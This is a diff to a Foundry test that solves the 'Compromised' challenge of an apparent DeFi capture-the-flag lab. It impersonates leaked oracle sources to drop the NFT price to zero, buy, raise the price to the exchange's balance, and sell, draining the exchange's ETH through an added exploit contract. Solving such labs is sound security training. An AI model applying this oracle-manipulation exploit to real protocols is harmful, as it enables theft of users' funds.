@@ -10,6 +10,9 @@ import {TrustfulOracleInitializer} from "../../src/compromised/TrustfulOracleIni
 import {Exchange} from "../../src/compromised/Exchange.sol";
 import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";
 
+// @audit-info nft on receive 
+import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
+
 contract CompromisedChallenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
@@ -74,8 +77,33 @@ contract CompromisedChallenge is Test {
     /**
      * CODE YOUR SOLUTION HERE
      */
-    function test_compromised() public checkSolved {
+
+    function setPrice(uint price) internal {
+        vm.startPrank(sources[0]);
+        oracle.postPrice(symbols[0],price);
+        vm.stopPrank();
         
+        vm.startPrank(sources[1]);
+        oracle.postPrice(symbols[0],price);
+        vm.stopPrank();
+    }
+
+    function test_compromised() public checkSolved {
+        // idea reduce the price cause its compromised
+        // buy the NFT from the exchange at a lower price
+        // increase the prices back to 999
+        // sell the NFT back to the exchange 
+        // transfer ETH from the player to recovery
+
+        // Question: how do I use the address to change the price
+        // I have to be able to call the functions as the proce
+        CompromisedExploit exploit = new CompromisedExploit{value:address(this).balance}(oracle, exchange, nft, recovery);
+
+        setPrice(0);
+        exploit.buy();
+        setPrice(EXCHANGE_INITIAL_ETH_BALANCE);
+        exploit.sell();
+        exploit.recover(EXCHANGE_INITIAL_ETH_BALANCE);
     }
 
     /**
@@ -93,5 +121,53 @@ contract CompromisedChallenge is Test {
 
         // NFT price didn't change
         assertEq(oracle.getMedianPrice("DVNFT"), INITIAL_NFT_PRICE);
+    }
+}
+
+
+contract CompromisedExploit is IERC721Receiver{
+
+    TrustfulOracle oracle;
+    Exchange exchange;
+    DamnValuableNFT nft;
+    uint nftId;
+    address recovery;
+
+    constructor(    
+        TrustfulOracle _oracle,
+        Exchange _exchange,
+        DamnValuableNFT _nft,
+        address _recovery
+    ) payable {
+        oracle = _oracle;
+        exchange = _exchange;
+        nft = _nft;
+        recovery = _recovery;
+    }
+
+    function buy() external payable{
+        uint _nftId = exchange.buyOne{value:1}();
+        nftId = _nftId;
+    }
+    
+    function sell() external payable{
+        nft.approve(address(exchange), nftId);
+        exchange.sellOne(nftId);
+    }
+
+    function recover(uint amount) external {
+        payable(recovery).transfer(amount);
+    }
+
+    function onERC721Received(
+        address operator,
+        address from,
+        uint256 tokenId,
+        bytes calldata data
+    ) external returns (bytes4){
+        return this.onERC721Received.selector;
+    }
+
+    receive() external payable{
     }
 }
